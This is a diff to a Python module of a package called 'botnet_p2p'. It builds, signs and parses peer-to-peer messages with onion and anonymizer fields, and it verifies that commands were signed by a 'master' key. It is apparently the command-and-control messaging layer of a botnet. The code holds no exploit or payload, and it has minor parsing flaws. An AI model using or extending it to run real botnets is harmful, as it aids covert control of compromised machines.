@@ -2,116 +2,97 @@
 
 from botnet_p2p import (
     ENCODING,
-    BAD_MSG_TYPE,
-    MSGTYPE_MSG_SEPARATOR,
-    MSG_SIGNEDHASH_SEPARATOR,
+    MSG_SEPARATOR,
+    DEFAULT_INT,
+    logger,
 )
 
 from botnet_p2p.security import (
     calculate_hash,
     sign_hash,
-    encrypt,
-    decrypt,
     verify_message,
 )
 
 
-class Message(object):
-    """Message with security features"""
+def structure_msg(msg_info: dict) -> bytes:
+    num_anonymizers = msg_info.get("num_anonymizers", 0)
+    final_onion = msg_info.get("onion", "default")
+    msg_type = msg_info["msg_type"]
+    msg = msg_info["msg"]
+    sign = msg_info.get("sign", "")
 
-    def __init__(self, msg_type: int = None, msg: str = None):
-        if isinstance(msg_type, int):
-            self.__msg_type = msg_type
-        else:
-            self.__msg_type = BAD_MSG_TYPE
+    builded_msg = (
+        str(num_anonymizers)
+        + MSG_SEPARATOR
+        + final_onion
+        + MSG_SEPARATOR
+        + str(msg_type)
+        + MSG_SEPARATOR
+        + msg
+    )
+    if sign:
+        builded_msg += MSG_SEPARATOR + sign
+    builded_msg_encoded = builded_msg.encode(ENCODING)
 
-        self.__msg = msg
+    return builded_msg_encoded
 
-    def get_msg_type(self):
-        return self.__msg_type
 
-    def get_msg_body(self):
-        return self.__msg
-    
-    def get_signed_hash(self):
-        return self.__signed_hash
+def sign_structured_msg(msg: bytes, private_key_path: str) -> bytes:
+    msg_to_sign = __get_msg_and_type(msg)
+    msg_hash = calculate_hash(msg_to_sign)
+    sign = sign_hash(msg_hash, private_key_path)
+    signed_msg = __append(sign, msg)
 
-    def sign_msg(self, private_key_path: str) -> bytes:
-        """ Build message following a structure so every bot in the P2P
-            can understand each other
+    return signed_msg
 
-            Args:
-                private_key_path: Location of private key to sign
 
-            Returns:
-                Bytes in a structured format
-        """
-        type_msg_joined = self.__join_msg_type_and_msg()
-        msg_hash = calculate_hash(type_msg_joined)
-        signed_hash = sign_hash(msg_hash, private_key_path)
-        final_msg = (
-            type_msg_joined.encode(ENCODING)
-            + f"{MSG_SIGNEDHASH_SEPARATOR}".encode(ENCODING)
-            + signed_hash
-        )
-        return final_msg
+def __get_msg_and_type(msg: bytes) -> bytes:
+    separator_encoded = MSG_SEPARATOR.encode(ENCODING)
+    splitted_msg = msg.split(separator_encoded)
 
-    def __join_msg_type_and_msg(self):
-        msg = f"{self.__msg_type}{MSGTYPE_MSG_SEPARATOR}{self.__msg}"
-        return msg
+    if len(splitted_msg) == 4:
+        msg_to_sign = separator_encoded.join(splitted_msg[2:])
+    else:
+        msg_to_sign = separator_encoded.join(splitted_msg[2:4])
 
-    def from_signed_msg(self, structured_msg: bytes, public_key_path: str) -> bool:
-        """ A message following the required structured
-            will be received. Private variables will be
-            filled.
+    return msg_to_sign
 
-            Args:
-                structured_msg: Message with specific structure
-                publick_key_path: Publick key location
-            
-            Return:
-                Whether the message can be trusted or not
-            
-            Raises:
-                cryptography.exceptions.InvalidSignature when signed hash
-                and hash do not match
-        """
-        structured_msg_decoded = structured_msg.decode(ENCODING)
 
-        self.__msg_type = self.__get_msg_type_from_signed_msg(structured_msg_decoded)
-        self.__msg = self.__get_msg_data_from_signed_msg(structured_msg_decoded)
-        self.__signed_hash = self.__get_signed_hash_from_signed_msg(structured_msg_decoded)
+def __append(this: bytes, to: bytes) -> bytes:
+    signed_msg = to + MSG_SEPARATOR.encode(ENCODING) + this
 
-        type_msg_join = self.__join_msg_type_and_msg()
-        return verify_message(public_key_path, type_msg_join, self.__signed_hash)
+    return signed_msg
 
-    def __get_msg_type_from_signed_msg(self, msg: str) -> int:
-        msg_type, _ = msg.split(MSGTYPE_MSG_SEPARATOR)
-        try:
-            return int(msg_type)
-        except ValueError:
-            return BAD_MSG_TYPE
 
-    def __get_msg_data_from_signed_msg(self, msg: str) -> str:
-        """ Get the data of the message. The data is the real message
-            without the message type nor the signed hash
+def signed_by_master(msg: bytes, public_key_path: str) -> bool:
+    signed_msg_part = __get_msg_and_type(msg)
+    logger.debug(f"Type and msg = {signed_msg_part}")
+    signed_hash = __get_signed_hash(msg)
+    veredict = verify_message(public_key_path, signed_msg_part, signed_hash)
 
-            Args:
-                msg: Received text
+    return veredict
 
-            Returns:
-                The message itself
-        """
-        msg_data = msg.split(MSGTYPE_MSG_SEPARATOR)[1].split(MSG_SIGNEDHASH_SEPARATOR)[
-            0
-        ]
-        return msg_data
 
-    def __get_signed_hash_from_signed_msg(self, msg: str) -> bytes:
-        _, signed_hash = msg.split(MSG_SIGNEDHASH_SEPARATOR)
-        return signed_hash.encode(ENCODING)
+def __get_signed_hash(msg: bytes) -> bytes:
+    signed_hash = msg.split(MSG_SEPARATOR.encode(ENCODING))[-1]
 
-    def __verify_sign(self, public_key_path: str) -> bool:
-        type_msg_joined = self.__join_msg_type_and_msg()
-        veredict = verify_message(public_key_path, type_msg_joined, self.__signed_hash)
-        return veredict
+    return signed_hash
+
+
+def breakdown_msg(msg: bytes) -> dict:
+    info = msg.decode(ENCODING).split(MSG_SEPARATOR)
+    try:
+        num_anonymizers = int(info[0])
+        msg_type = int(info[2])
+    except ValueError as e:
+        num_anonymizers = DEFAULT_INT
+        msg_type = DEFAULT_INT
+    msg_info = {
+        "num_anonymizers": num_anonymizers,
+        "onion": info[1],
+        "msg_type": msg_type,
+        "msg": info[3],
+        "sign": info[4],
+    }
+
+    return msg_info
